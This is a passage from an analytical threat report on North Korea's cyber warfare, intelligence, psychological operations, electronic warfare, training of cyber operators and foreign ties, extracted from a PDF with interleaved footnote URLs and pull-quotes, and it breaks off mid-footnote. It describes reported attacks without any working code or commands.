economic state150 , further explains the regime ’s reliance on these tactics . In 2014 , the regime
reportedly spent 16% of its budget on defense.151 The North Korean military places a strong
emphasis on information warfare capabilities including political and psychological warfare152 and
cyber or hacker warfare.153
The report by Capt . Duk - Ki Kim , Ph.D. highlighted North Korea ’s counter - asymmetric strategy and
ranked each based on intensity and frequency :
Figure 14 Threat matrix of North Korean asymmetric war capabilities.154
Cyber warfare operations
Just ten years ago , experts noted that North Korea was one of the “ least network - ready and most
isolated societies on the planet.”155 Today North Korea ’s air - gapped networks and prioritization of
resources for military use provide both a secure and structured base of operations for cyber
operations and a secure means of communications.156 North Korea ’s hermit infrastructure creates
146
http://www.history.army.mil/brochures/kw-balance/balance.htm
147
http://www.bbc.com/news/world-asia-pacific-11813699
148
http://www.princeton.edu/~achaney/tmve/wiki100k/docs/Asymmetric_warfare.html
149
http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf
150
http://www.foreignpolicy.com/articles/2013/04/29/7_things_north_korea_is_really_good_at
151
http://blogs.wsj.com/korearealtime/2014/04/10/north-korea-details-budget-plans/
152
https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
153
http://www.giac.org/paper/gsec/1870/information-warfare/103284
154
https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
155
http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH4.pdf
156
http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf
a cyber - terrain that deters reconnaissance . Because North Korea has few Internet connections to
the outside world , anyone seeking intelligence on North Korea ’s networks has to expend more
resources for cyber reconnaissance.157 A 2003 article by the U.S. Office of the National
Counterintelligence Executive assessed that “ Development of the nation , rather than
empowerment of the individual , appears to be driving DPRK efforts to develop domestic IT
infrastructure and industry.”158 In November 2013 , Kim Jong Un referred to cyber warfare
capabilities as a “ magic weapon ” in conjunction with nuclear weapons and missiles.159
According to Kim Heung - kwang , a North Korean defector and former computer science professor ,
the regime has the following motivations for expanding its cyber warfare capabilities:160
    Cyber capabilities are a cost - effective way to offset North Korea ’s lack of kinetic military
prowess .
    North Korea ’s school systems place a strong emphasis on math , giving the nation
confidence in its programmers , cryptographers , and security researchers .
    In the modern warfare landscape , cyber capabilities are potentially more utilitarian than
heavy artillery or aircraft .
    Cyber warfare capabilities provide a platform for espionage , psychological operations ,
and other forms of non - kinetic warfare .
    Considering the separatist nature of North Korea ’s infrastructure , cyber warfare provides
a strategic advantage since outbound attacks are possible , but inbound attacks would
have limited reach .
    Cyber warfare allows North Korea to leverage the Internet ’s inherent flaws for offensive
purposes while maintaining its defenses , primarily via air - gapping its most critical
networks from the outside world .
North Korea ’s attack and defense capabilities reportedly include the following cyber warfare and
electronic warfare components : offensive cyber operations ( OCO ) ; computer network operations
( CNO ) , which includes both computer network attack ( CNA ) and computer network exploitation
( CNE ) ; distributed denial of service ( DDoS);161 satellite monitoring ; drones ; GPS jamming
capabilities162 ; and deployment of electromagnetic pulse ( EMP).163 North Korea ’s OCO and CNO
capabilities became apparent as early as 2004 , when North Korea reportedly gained access to 33
of 80 South Korean military wireless communication networks . In June 2006 , an attack on the U.S.
State Department originating in the East Asia - Pacific region coincided with U.S .- North Korea
negotiations over the regime ’s nuclear missile testing.164 A month later , a South Korean military
report implicated North Korea ’s Unit 121 in hacking the South Korean and U.S. Defense
Departments . North Korea also tested a logic bomb in October 2007 . A logic bomb is malicious
157
http://www.huffingtonpost.com/2011/07/25/digital-revolution-north-korea_n_908368.html
158
http://www.ncix.gov/publications/archives/docs/NORTH_KOREA_AND_FOREIGN_IT.pdf
159
http://english.chosun.com/site/data/html_dir/2013/11/05/2013110501790.html
160
http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html
161
http://www.defense.gov/pubs/ReporttoCongressonMilitaryandSecurityDevelopmentsInvolvingtheDPRK.pdf
162
https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
163
http://www.theregister.co.uk/2014/04/22/norks_drones_made_in_china/
164
http://www.informationweek.com/state-department-releases-details-of-computer-system-attacks/d/d-id/1045112 ?
code programmed to execute based on a pre - defined triggering event . Following the logic bomb
test , the UN passed a resolution banning sales of certain computer hardware to North Korea.165
North Korea considers its cyber warfare capabilities an important asymmetric asset in the face of
its perceived enemies , the U.S. and South Korea . While North Korea does not have an immersive
digital culture , both the U.S. and South Korea are heavily dependent upon technological
infrastructure for social , economic , and political stability.166 For this reason , a cyber attack that
cripples or compromises the reliability of the U.S. or South Korea ’s technological infrastructure
could have a far - reaching impact .
Gaming for profit and pwnage
North Korea has reportedly used computer games for both illegal capital gain and
North Korea has used
orchestrating cyber attacks . In 2011 , South Korean police arrested five individuals ,
computer games for both
including one Chinese national , for allegedly collaborating with North Korean hackers           illegal capital gain and
affiliated with the Korea Computer Center to steal money via online games.167                   orchestrating cyber attacks .
According to South Korean reports , the culprits used an auto - player to quickly
progress in the massively multiplayer online role - playing game ( MMORPG ) “ Lineage ” and were
able to use the game ’s market to obtain real currency.168 In 2013 , South Korean officials released
information stating they had found evidence that North Korea was using games as a medium for
infecting machines and launching cyber attacks . North Korea had used game downloads to infect
100,000 South Korean machines for a botnet used to launch a distributed denial of service ( DDoS )
attack against Incheon Airport.169 This clever tactic sought to leverage a seemingly innocent game
as a force multiplier in order to amplify the effects of a DDoS attack on a critical infrastructure
target . However , in this case , there was little impact on the target .
Intelligence and counterintelligence
North Korea ’s intelligence program is one of its strongest military assets , providing foundational
support for all other military operations . The regime ’s cyber warfare capabilities , in particular , rely
heavily on open - source intelligence ( OSINT ) collection and cyber - espionage . 170 As noted in a CIA
publication , " It is a significant irony of our information age that open - source intelligence is
contributing to the survival and development of one of the world 's most secretive regimes."171
Historically , the primary goals of the regime ’s intelligence program included collection and
dissemination of intelligence concerning any possible political , military , or economic threat to the
regime ’s security and stability . Secondary goals have included " acquisition of foreign military and
civilian technologies and equipment , support of the DPRK ’s foreign policy goals , training and
165
http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea
166
http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH2.pdf
167
http://www.theguardian.com/technology/2011/aug/04/south-north-korean-hackers-china
168
http://english.chosun.com/site/data/html_dir/2011/05/06/2011050600827.html
169
http://www.zdnet.com / blog / security / north - korea - ships - malware - infected - games - to - south - korean - users - uses - them - to - launch - ddos-
attacks/12383
170
http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf
171
https://www.cia.gov/library/center-for-the-study-of-intelligence/csi-publications/csi-studies/studies/vol48no1/article04.html
support for foreign revolutionary and terrorist organizations , and the acquisition of foreign capital
for state and intelligence operations."172
North Korea has a broad reach for intelligence collection , which extends to cyber intelligence.173
In April 2013 , Solutionary , a company providing managed security services , reported a marked
increase in both overt attacks and information gathering attempts originating from
North Korean IPs . Solutionary refers to any overt external attacks on company                A faction of ethnic North
Koreans residing in Japan ,
networks or attempts to steal data as " touches . ” They reportedly recorded 12,473 of
known as the Chongryon ,
these touches in February 2013 , 11,000 of which were directed at a single financial          are critical to North Korea ’s
institution . As a baseline , Solutionary noted that typically only 200 incidents per          cyber and intelligence
month are traced to North Korean origin . This is an interesting claim , considering
174                                               programs .
that attacks attributed to North Korea are usually routed through other countries .
As mentioned above , a faction of ethnic North Koreans residing in Japan , known as the Chongryon ,
are critical to North Korea ’s cyber and intelligence programs and help generate hard currency for
the regime . The Chongryon headquarters has been recognized as the de facto North Korean
embassy in Japan . In 2012 , the organization ’s headquarters was seized to pay for the group ’s
past due debts.175
Figure 15 Headquarters of the Chongryon.176
172
http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH13.pdf
173
http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf
174
http://www.usatoday.com/story/tech/2013/04/26/cyberspying-from-north-korean-ip-addresses-spike/2115349/
175
http://sundaytimes.lk/?option = com_content&view = article&id=21034:japan - court - approves - seizure - of - nkorea - embassy-
media&catid=81:news&Itemid=625
176
http://www.nknews.org/2014/02/chongryon-still-pyongyangs-pawn-in-covert-operations-former-intelligence-officer/
It was then purchased by a monk named Ekan Ikeguchi , who let the Chongryon continue to use
the building in what he referred to as a “ goodwill gesture ” . Ikeguchi is one of the Chongryon‘s
many ties to organized crime . Ikeguchi was arrested in the past for an attempted coup against the
Japanese government . He also has ties to the political group Nihon Seinensya , which is involved in
illegal activities in conjunction with the yakuza syndicate Sumiyoshi - kai , which imports and sells
amphetamines made in North Korea.177 North Korea also has black market ties to Sumiyoshi - kai ’s
rival syndicate , Yamaguchi - gumi . Many members of the Kodo - kai , Yamaguchi - gumi ’s ruling
faction , are Korean - Japanese , with ties to North Korea.178 Masahiro Namikawa , leader of the drug
trafficking Seido - kai yakuza organization , also has ties to the Chongryon.179
The Chongryon operate at least two websites , chongryon.com , which is in Japanese , and korea-
np.co.jp .
WHOIS records for chongryon.com indicate that it was registered by “ guanin o ” using the email
address park2@mac.com . The WHOIS information for korea-np.co.jp . shows that it was
registered by Choson Shinbo Company Inc. The WHOIS records for these sites can be found in
Appendix A.
Additionally , the Chongryon operate a ferry called the Mangyongbong-92 , the only direct transit
from Japan to North Korea . In 2003 , they were suspected of using the ferry to smuggle missile
parts.180 In 2006 , the ferry was temporarily banned from Japanese waters when Japanese officials
discovered the Chongryon were using it to smuggle dual - use electronics to North Korea to be
used for military purposes.181
North Korea has a global network of state - run businesses located in 30 to 40                                                   North Korea has a global
countries that is used for espionage activities . The Reconnaissance General Bureau                                             network of state - run
is responsible for oversight of this network.182 The businesses include cafes and                                              businesses located in 30 to
other non - suspect establishments . The highest concentration of these is in China .                                              40 countries that is used for
espionage activities . These
Members of this espionage network reportedly “ send more than $ 100 million in
establishments are also
cash per year to the regime and provide cover for spies.”183 These establishments                                              used for money laundering
are also used for money laundering and drug trafficking.184                                                                    and drug trafficking .
The regime is also known to kidnap foreign citizens and use them as instruments
for intelligence . Prisoners are first tortured and psychologically conditioned to bend to the
regime ’s will . They are then used based on their skillset . This may include teaching their language
to North Koreans , spreading propaganda in their native language , providing translation services ,
177
http://japandailypress.com/religious-group-that-bought-north-korean-embassy-building-has-mob-ties-0826568/
178
http://culturmag.de/crimemag/jake-adelstein-the-yakuza-2/20212
179
http://www.thedailybeast.com/articles/2013/06/25/the-great-japanese-gang-wars.html
180
http://news.bbc.co.uk/2/hi/asia-pacific/2958968.stm
181
http://www.washingtontimes.com/news/2006/oct/16/20061016-122859-4745r/
182
http://www.ibtimes.com/north-koreas-international-network-restaurants-used-gain-hard-currency-espionage-1427242
183
http://www.outsideonline.com / outdoor - adventure / politics / Did - North - Korea - Kidnap - This - American-
Hiker.html?utm_content = buffer6bd46&utm_medium = social&utm_source = twitter.com&utm_campaign = buffer
184
http://freebeacon.com/national-security/north-koreas-overseas-restaurants-used-for-espionage-and-gaining-hard-currency/
conducting military training , or other skills the regime deems useful.185 In July 2014 , Japanese
officials agreed to lift some sanctions on North Korea when the regime agreed to investigate the
whereabouts of Japanese citizens who were allegedly abducted by North Korean agents decades
ago . Sanctions to be lifted include the ban on port calls to Japan by North Korean ships.186
North Korea has also infiltrated important positions in South Korea for both intelligence and
psychological operations purposes.187 In 2011 , South Korea ’s National Intelligence
Service reportedly discovered the presence of Communist spies . These spies within their trusted
circles had been reporting back to North Korea for almost 10 years . The embedded spies included
a Democratic Party representative . According to the agency , the spies were on a mission to
infiltrate and influence the Democratic Party and to gather military intelligence.188 The regime also
attempts to infiltrate organizations made up of North Koreans who seek shelter in South Korea , in
order to gain intelligence . In the past several years , South Korea has arrested at least 14 defectors
who were found to be spies.189
These intelligence collection and counterintelligence capabilities are an attempt to provide the
regime with a strategic asymmetrical advantage . The regime leverages its human and cyber
resources around the globe to provide an influx of intelligence , while very little credible
intelligence about the regime ’s activities and capabilities ever becomes available to the outside
world .
Psychological operations
North Korea continues to be a master of propaganda and deception and leverages the cyber
realm for psychological operations . Modern North Korean psychological operations tactics include
distribution of propaganda via traditional media outlets , websites , and social media . Many of
these psychological operations campaigns are politically focused.190 According to Dr. Andrei
Lankov , the North Korean government has “ very rational and highly successful manipulators who
usually get what they want by outsmarting everybody else in the process.”191
The regime ’s Unit 204 is responsible for cyber - psychological operations . These
operations are PSYOP tailored for the cyber arena . In order to be successful , cyber-      Such messages can be
used for recruitment ,
psychological campaigns require speed , precision , and creativity . These campaigns         cyber mobilization , and to
leverage the phenomenon of viral , unverified news stories that tend to rapidly            instill fear in a target
propagate via social media , mobile text messaging , and other electronic                   population .
communications . This phenomenon creates an arena for strategic propagation of both
fact and fiction for the purposes of sentiment manipulation . Such messages may be used for
185
http://www.outsideonline.com / outdoor - adventure / politics / Did - North - Korea - Kidnap - This - American-
Hiker.html?utm_content = buffer6bd46&utm_medium = social&utm_source = twitter.com&utm_campaign = buffer
186
http://m.us.wsj.com/articles/tokyo-to-lift-some-sanctions-on-pyongyang-1404354699?mobile=y
187
http://www.nytimes.com/2013/10/02/world/asia/northern-spy-lifts-cloak-on-koreas-deadly-rivalry.html?pagewanted=2
188
http://www.kccoc.org/home/?mid=eng_kccoc_info_korea&document_srl=3223&sort_index=readed_count&order_type=desc
189
http://www.washingtonpost.com / world / prominent - n - korean - defector - acquitted - of - espionage - by - s - korean - court/2013/08/22/642b3712 - 0b19-
11e3 - 89fe - abb4a5067014_story.html
190
https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
191
http://www.reddit.com/r/NorthKoreaNews/comments/296ryd/i_am_dr_andrei_lankov_i_studied_in_north_korea/
recruitment , cyber mobilization , and to instill fear in a target population . Cyber - psychological
operations may also include mental suggestion using technology as a delivery mechanism for
subliminal cues . It is unknown whether North Korea possesses this capability.192
North Korean citizens have access to state - approved social networks on the Kwangmyong.193
Figure 16 A photo posted by Jean Lee on Instagram shows one of the social networking sites on
the Kwangmyong.194
The regime has a limited overt social media presence on the Internet . Some of the known social
media platforms employed by the regime include Twitter , Facebook , and YouTube . The YouTube
channel North Korea Today , operated by user rodrigorojo1 , features news clips from North Korea .
It is unclear whether this channel is officially sanctioned.195 The North Korea Today YouTube
channel also has corresponding profiles on Twitter196 and Facebook.197
192
http://fmso.leavenworth.army.mil/documents/new-psyop.pdf
193
http://www.austinchronicle.com/daily/sxsw/2013-03-11/social-media-in-north-korea/
194
http://instagram.com/p/WpcJs1OCkb/
195
https://www.youtube.com/user/rodrigorojo1
196
https://twitter.com/NorthKoreaT0day
197
https://www.facebook.com/pages/Korean-Central-Television/380193555435568?fref=ts
Figure 17 A screenshot of the North Korea Today YouTube Channel.198
The Uriminzokkiri website , known for pushing juche ideology and anti - American and anti - South
Korean messages , has accompanying social media profiles on YouTube,199 Google+,200 and
Facebook.201 It also has Twitter profiles in both Korean202 and English.203
198
https://www.youtube.com/user/rodrigorojo1
199
https://www.youtube.com/user/uriminzokkiri
200
https://plus.google.com/u/0/112306344682887627095
201
https://www.facebook.com/pages/Uriminzokkiri/124452740935216
202
https://twitter.com/uriminzok
203
https://twitter.com/uriminzok_engl
Figure 18 A screenshot of the Uriminzokkiri YouTube channel.204
Figure 19 A screenshot from the Uriminzokkiri Facebook page shows anti - U.S. and pro - juche
rhetoric.205
204
https://www.youtube.com/user/uriminzokkiri/featured
205
https://www.facebook.com/pages/Uriminzokkiri/124452740935216
Figure 20 A screenshot of the Uriminzokkiri Korean language Twitter profile.206
Figure 21 A screenshot of the Uriminzokkiri English language Twitter profile.207
North Korean propaganda208 is used for several purposes : to enforce the ideals of allies        In the spirit of juche ,
and sympathizers , to frame North Korea in a favorable light to outsiders , to                    the regime uses
sensationalize the regime ’s perceived self - reliance and military prowess , and to shield its     disinformation to “ hide
lapses or tout
own citizens from the outside world.209 Juche ideology and indoctrination of the regime ’s
accomplishments that
youth ensure support of the local population . North Koreans accept military duty as an          may have never been
honor and strive to excel in their service to the regime . In the spirit of juche , the regime    achieved . ”
uses disinformation to “ hide lapses or tout accomplishments that may have never been
206
https://www.facebook.com/pages/Uriminzokkiri/124452740935216
207
https://twitter.com/uriminzok_engl
208
http://www.ncix.gov/publications/archives/docs/NORTH_KOREA_AND_FOREIGN_IT.pdf
209
http://fas.org/irp/eprint/cno-dprk.pdf
achieved.”210 Limiting citizen access to the outside world by instituting the Kwangmyong intranet ,
North Korea ensures its citizens are not exposed to outside information that is counterproductive
to citizen indoctrination or in conflict with juche ideals . North Korea portrays the West , particularly
the United States , as an enemy . The regime uses this strategy of shifting the population ’s
negative sentiments toward an external entity to keep its citizens ignorant of North Korea ’s own
economic hardship , regime brutality , and systemic incompetence.211 For example , prior to Kim
Jong Il ’s death in 2011 , North Korean media altered photos of their “ Dear Leader ” to make him
appear younger and healthier than he really was . This became obvious when the altered photos
were compared to those taken by Western media around the same time . 212
According to Dr. Andrei Lankov , “ North Koreans now have a much better understanding of what is
going on in the outside than they did before . This is largely thanks to the spread of DVDs and
video content in the country , but also because some of them have been to China and talk about
what they have seen … many [ of ] them sincerely believe that the United States remains ready to
attack at any moment and that Japan is an incurably aggressive place … nearly all of them swallow
the official propaganda myths about the Korean War being started by the ' American Imperialists '
who invaded them . Hence , they see the outside world as an inherently dangerous place.”213 Some
human rights groups seek to reach out to North Korean citizens and break them from this
isolation . In August 2014 , the New York - based charity Human Rights Foundation sponsored a
hackathon in San Francisco called “ Hack North Korea ” to find new ways to get information in , out ,
and around North Korea . The event brought together many programmers , human rights
campaigners , and defectors.214
North Korea even uses “ trolling ” as a PSYOP tactic . On the Internet , “ trolls ” are users who post
messages that are often crass , controversial , inflammatory , or offensive , in order to evoke a
strong reaction or influence a reader ’s opinion . Often , the motivation for trolling is simply for the
troll ’s enjoyment . The rude and offensive trolling tactics are in stark contrast to traditional forms
of persuasive rhetoric . However , North Korea reportedly utilizes over 200 military intelligence
operatives to troll South Korean message boards and social media pages with pro - North Korean
sentiments.215 Matt Rhoades , director of the cyberspace and security program at the Truman
National Security Project , said , " North Korea 's cyber - development is almost just a new
harassment mechanism for them , a low - cost , asymmetric method to harass its neighbor in the
south … "216
Leveraging the cyber and intelligence resources noted above , North Korea ’s psychological
operations serve an important strategic role . The ability to influence outsiders , while effectively
isolating its own population from most outside influence , allows North Korea to remain an
enigma . Additionally , in line with its PSYOP tactics , North Korea may strategically take credit for
cyber attacks that were , in reality , launched by another entity . Whether the targeted entity blames
210
http://www.ists.dartmouth.edu/docs/cyberwarfare.pdf
211
http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf
212
https://www.strategypage.com/htmw/htmurph/articles/20131106.aspx
213
http://www.reddit.com/r/NorthKoreaNews/comments/296ryd/i_am_dr_andrei_lankov_i_studied_in_north_korea/
214
http://www.northkoreatech.org/2014/08/05/hack-north-korea-focuses-silicon-valley-on-information-flow/
215
http://www.strategypage.com/htmw/htiw/articles/20131213.aspx
216
http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4
North Korea for the attacks , or the regime simply takes credit for an attack that has not yet been
attributed , several PSYOP goals can come into play . First , to claim credit for an attack amplifies
the impact of a show of force , particularly if South Korea is the target . This tactic can be used to
stir sentiments in order to provoke a reaction . Second , North Korea may lay claim to responsibility
for an attack that exceeds its capabilities in order to seem more technologically advanced and
more capable . Third , any success , or the appearance thereof , enforces the juche ideal of regime
self - sufficiency . Finally , North Korea may act as a scapegoat and claim credit for a cyber attack of
an ally such as China so the attack is not attributed to the real actors.217
Electronic warfare
North Korea reportedly has the electronic warfare capabilities to jam GPS and to inject false GPS
coordinates.218 North Korea demonstrated these capabilities in March 2011 by jamming South
Korea ’s GPS signals during a joint U.S .- South Korea military exercise.219 North Korea has the
capability to create an EMP.220 An EMP is a sudden , extreme outburst of atmospheric electricity
creating an intense magnetic field that can burn out electrical equipment . 221 A report from the
U.S. Department of Homeland Security ( DHS ) noted North Korea ’s ability to deliver a nuclear
warhead as a satellite over the South Pole , effectively creating the burst needed to deliver an EMP
targeting the United States . An EMP could effectively disrupt electronic communications including
critical infrastructure components such as telecommunications , financial institutions , the energy
sector , transportation , food and water delivery , emergency services , and space systems . 222 North
Korea reportedly acquired its EMP technology from Russia.223
North Korea also has a drone program . The regime reportedly acquired its first drones in the late
1980 ’s or early 1990 ’s . The regime ’s drones are complimentary to its intelligence program and
are primarily used for surveillance.224 In early 2014 a North Korean drone crashed south of the
38th parallel , the line dividing North Korea from the south.225 While early reports noted that the
drones appeared similar to those manufactured by Chinese company Tauyuan Navigation Friend
Aviation Technology , the company denied involvement.226
217
http://fas.org/irp/doddir/army/fm3-05-301.pdf
218
https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
219
http://www.reuters.com/article/2011/05/03/us-korea-north-cyber-idUSTRE7421Q520110503
220
http://defensetech.org/2007/12/24/inside-dprks-unit-121/
221
http://usatoday30.usatoday.com/tech/science/2010-10-26-emp_N.htm
222
http://www.wnd.com/2014/04/dhs-study-north-korea-capable-of-emp-attack-on-u-s/
223
http://www.extremetech.com/extreme/170563-north-korea-emp
224
http://38north.org/2014/07/jbermudez070114/?utm_source=feedly&utm_reader=feedly&utm_medium=rss&utm_campaign=jbermudez070114
225
http://www.popsci.com/blog-network/eastern-arsenal/north-koreas-new-drones-are-chinese-which-opens-new-mystery
226
http://www.scmp.com/news/china-insider/article/1494207/north-korean-drones-not-theirs-says-chinese-retailer
Figure 22 A drone attributed to North Korea . 227
Stressing the importance of the regime ’s electronic warfare capabilities , in 1999 former regime
leader Kim Jong Il said “ The basic key to victory in modern warfare is to do well in electronic
warfare.”228 Since the regime ’s advanced technology lags behind that of South Korea and the U.S. ,
its capability to disrupt the communications of these perceived adversaries is a vital asymmetric
capability.229
Training cyber warriors
North Korea utilizes primary and secondary education and the university system to train its cyber
warfare operators . According to reports by defectors , the regime seeks out children who show
mathematical talent and sends them through rigorous advanced training.230 A vintage North
Korean animation stresses the importance of mathematics in North Korean education . The short
film follows a young boy as he does his geometry homework . The frustrated boy begins to
daydream then has visions of going to war with the U.S. and needing geometry to effectively
calculate missile trajectory during the battle.231
227
http://blogs.wsj.com/korearealtime/2014/04/02/seoul-points-to-north-korea-in-crashed-drones-investigation/
228
http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH13.pdf
229
http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH5.pdf
230
http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html
231
http://theweek.com/article/index/255243/how-to-kill-americans-with-geometry-a-north-korean-propaganda-film-for-kids
Figure 23 A screenshot from the North Korean animation depicting geometry as a necessary skill
for battle.232
Science and technology students are expected to learn foreign languages , which may include
Chinese , Japanese , and English.233 Student emails , chats , and web browsing activities are heavily
monitored.234 Around age twelve or thirteen , chosen students are enrolled in accelerated
computer courses at First and Second Geumseong Senior - Middle Schools .
232
https://www.youtube.com/watch?v=ujtp-70zQME
233
https://www.cia.gov/library/center-for-the-study-of-intelligence/csi-publications/csi-studies/studies/vol48no1/article04.html
234
http://www.thestar.com/news/world/2014/02/23/north_korea_where_the_internet_has_just_5500_sites.html #
Figure 24 North Korean students training for cyber war.235
The successful students are then sent to Kim Il - sung University , Kim Chaek University of
Technology,236 or the Command Automation University , traditionally known as Mirim University .
Kim Il - sung University ’s computer center was started in 1985 . Its computer courses have a heavy
programming element . The university reportedly developed the Intelligent Locker hard disc
protection program , Worluf Antivirus , SIMNA ( simulation and system analysis program ) , a war
games program , a hepatitis diagnosis and prescription system , and a C++ program development
tool called FC 2.0.237 Kim Il - sung University also has programs focusing on nuclear research.238
Kim Chaek University of Technology was established in 1948 . In the late 1990s , it began to
restructure its computer - focused courses to reflect more modern technologies . As of 2002 , the
university had three colleges focusing on computer science , information science and technology ,
and machine science . Software developed by the university includes Computer Fax and SGVision ,
an image - reprocessing program used for steganography.239 Students and instructors must
submit a formal request for permission in order to use the Internet for research.240
235
http://www.courierpress.com/news/2013/apr/19/young-north-koreans-train-seek-revenge-us/
236
http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html
237
http://www.ists.dartmouth.edu/docs/cyberwarfare.pdf
238
http://www.nti.org/facilities/789/
239
http://www.ists.dartmouth.edu/docs/cyberwarfare.pdf
240
http://www.theguardian.com/world/2013/jan/08/north-korean-google-chief-search
The Command Automation University periodically chooses around 100 students for an intensive
five - year course prior to their assignment to serve in cyber intelligence and cyber warfare
capacities.241 Programs at the Command Automation University include command automation ,
computers , programming , automated reconnaissance , and electronic warfare.242 Other students
attend a two - year accelerated university program , then study abroad in Russia or China before
they are assigned to a cyber - operator role.243
The elite cyber operators are given special incentives . For example , parents of students
graduating from the cyber program with top scores are given the opportunity to live in
Pyongyang ; and married cyber operators are given housing , a food allowance , and a stipend if
operating overseas . Due to the nature of their profession , these cyber elite are some of the only
North Koreans allowed to access the outside Internet.244
Important political and military ties
While this report focuses on North Korea ’s cyber warfare capabilities , these capabilities can not be
fully separated from the implications of partnerships with countries known to deal in illegal
weapons trade with the regime . Now that cyberspace has become a legitimate arena for warfare ,
these nations are also potential allies in the cyber realm . For this reason , the regime ’s key political
and military relationships are explored below .
China
North Korea has a longstanding historical relationship with China . During the Korean War ( 1950-
1953 ) , China allied with North Korea ’s Communist forces . China has also provided ongoing
political and economic support to the regime ’s leadership and is a primary trade partner . North
Korea is economically dependent on China . North Korea gets an estimated 90 percent of its
energy imports , 80 percent of its consumer goods , and 45 percent of its food supply from China .
This relationship is prudent – in the event of a military conflict , China can strategically use North
Korea as a buffer zone between itself and South Korea , where many U.S. military personnel are
stationed . Chinese aid to North Korea also deters the likelihood that the regime will collapse ,
resulting in internal destabilization that could catalyze a U.S .- China conflict.245
North Korea relies heavily on China for technological resources . As noted above , North Korea
relies on China ’s Unicom for Internet access.246 Additionally , the regime sends some of its cyber
warriors to train in China247 and stations a portion of its Unit 121 personnel in Shenyang.248 Some
of North Korea ’s official websites are hosted in China , 249 and KCC has a branch office there.250
241
https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
242
http://www.ists.dartmouth.edu/docs/cyberwarfare.pdf
243
http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html
244
http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html
245
http://www.cfr.org/china/china-north-korea-relationship/p11097#p1
246
https://rdns.im/the-pirate-bay-north-korean-hosting-no-its-fake-p2
247
http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html
248
http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4
249
http://binarycore.org/2012/05/30/investigating-north-koreas-netblock-part-3-topology/
250
http://www.naenara.com.kp/en/kcc/
North Korea also relies on China to provide much of its network hardware , including servers and
routers.251
Russia
North Korea has a long history of ties to Russia . The former Soviet Union was the major sponsor
of the North Korean state and a major trading partner . Following the dissolution of the Soviet
Union , aid to North Korea was halted and trade diminished significantly . This chain of events
contributed to North Korea ’s eventual economic collapse , as it could not survive without aid.252
North Korea currently has a collaborative relationship with Russia in the cyber realm . The regime ’s
CSTIA relies on Russia as one of several sources for technical data.253 North Korea also sends
some of its cyber warriors to train in Russia,254 and the regime reportedly acquired its EMP
technology from there.255
Political ties between Russia and North Korea have become stronger in recent months . In 2014 ,
potentially as a result of the U.S. response to the Russian - Ukranian conflict , Russia began to
strengthen ties with North Korea . Negotiations reportedly included promises of trade and
development projects . Narushige Michishita , a North Korea and Asia security expert at Japan 's
National Graduate Institute for Policy Studies , stated “ By strengthening its relationship with North
Korea , Russia is trying to enhance its bargaining position vis - à - vis the United States and Japan.”256
Russia also recently forgave most of the regime ’s debts.257
Iran
North Korea and Iran have longstanding political and military ties . North Korea supplied Iran with
conventional arms during the Iran - Iraq War . Iran and North Korea reportedly collaborate closely in
ballistic missile development efforts . In the past , Iran provided the North Korean regime with
necessary funds and oil in exchange for missile parts and technology . 258 259 In 2009 , a North
Korean plane transporting 35 tons of weapons and allegedly bound for Iran was seized after
making an unscheduled stop in Bangkok , Thailand . That same year , United Arab Emirates seized a
ship bound for Iran that was transporting several containers of North Korean weapons , including
rocket - propelled grenades and ammunition . Reportedly , the customer was a company affiliated
with Iran ’s Islamic Revolutionary Guard Corps . 260 261
North Korea also has cyberwar ties with Iran . In 2012 , North Korea and Iran signed a technology
treaty to help combat “ common enemies ” in cyberspace . The treaty included provisions for
cooperation in research , student exchanges , and joint laboratories . Joint projects reportedly
251
http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4
252
http://www.aljazeera.com/indepth/opinion/2014/06/n-korea-russia-step-toward-worl-201462253320470677.html
253
https://www.cia.gov/library/center-for-the-study-of-intelligence/kent-csi/vol48no1/pdf/v48i1a04p.pdf
254
http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html
255
http://www.extremetech.com/extreme/170563-north-korea-emp
256
http://www.theguardian.com/world/2014/jun/04/russia-bolster-ties-north-korea
257
http://www.voanews.com/content/russia-forgives-north-korean-debt/1939188.html
258
